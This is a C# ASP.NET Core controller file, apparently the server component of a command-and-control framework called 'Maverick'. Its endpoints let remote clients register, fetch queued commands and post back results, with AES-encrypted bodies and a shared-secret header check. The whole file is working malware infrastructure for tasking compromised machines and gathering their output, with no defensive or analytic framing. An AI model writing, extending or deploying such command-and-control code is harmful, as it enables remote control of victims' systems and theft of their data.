using Maverick.Commander.Services;
using Maverick.Models;
using Maverick.Models.Command;
using Maverick.Utility;
using Microsoft.AspNetCore.Mvc;
using System.Text;
using System.Text.Json;

#pragma warning disable IDE0290

namespace Maverick.Commander.Controllers
{
    [ApiController]
    [Route("api")]
    public class CommandController : ControllerBase
    {
        private readonly ILogger<CommandController> _logger;
        private readonly ICommandAndControl _commandAndControl;
        private readonly string HeaderHashCheck = Crypto.GetHash(Key.SecretKey);

        public CommandController(ILogger<CommandController> logger, ICommandAndControl commandAndControl)
        {
            _logger = logger;
            _commandAndControl = commandAndControl;
        }

        private bool IsValidRequest()
        {
            if (!Request.Headers.TryGetValue("X-Request-Hash", out var receivedHash))
            {
                return false;
            }
            return receivedHash == HeaderHashCheck;
        }

        [HttpPost("get")]
        public async Task<IActionResult> ClientRequestCommand()
        {
            if (!IsValidRequest())
            {
                return Unauthorized();
            }
            using var ms = new MemoryStream();
            await Request.Body.CopyToAsync(ms);
            var encryptedData = ms.ToArray();
            var rawBody = await Crypto.DecryptAESPayload(encryptedData);
            var json = Encoding.UTF8.GetString(rawBody);
            if (!int.TryParse(json, out var ClientId)) return BadRequest();
            var command = _commandAndControl.GetCommandForClient(ClientId);
            if (command == null)
                return Ok();
            var encryptedCommand = await Crypto.EncryptAESPayload(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(command)));
            return Ok(encryptedCommand);
        }

        [HttpPost("post")]
        public async Task<IActionResult> ClientRequestResult()
        {
            if (!IsValidRequest())
            {
                return Unauthorized();
            }
            using var ms = new MemoryStream();
            await Request.Body.CopyToAsync(ms);
            var encryptedData = ms.ToArray();
            var rawBody = await Crypto.DecryptAESPayload(encryptedData);
            var json = Encoding.UTF8.GetString(rawBody);
            var commandResult = JsonSerializer.Deserialize<CommandRequestModel>(json);
            if (commandResult == null)
                return BadRequest();
            await _commandAndControl.UpdateCommand(commandResult);
            return Ok();
        }

        [HttpPost("new")]
        public async Task<IActionResult> ClientNewConnect()
        {
            if (!IsValidRequest())
            {
                return Unauthorized();
            }
            using var ms = new MemoryStream();
            await Request.Body.CopyToAsync(ms);
            var encryptedData = ms.ToArray();
            var rawBody = await Crypto.DecryptAESPayload(encryptedData);
            var json = Encoding.UTF8.GetString(rawBody);
            var newClientInfo = JsonSerializer.Deserialize<InfoClientModel>(json);
            if (newClientInfo == null)
                return BadRequest();
            _commandAndControl.UpdateNewClient(newClientInfo);
            return Ok();
        }


    }
}
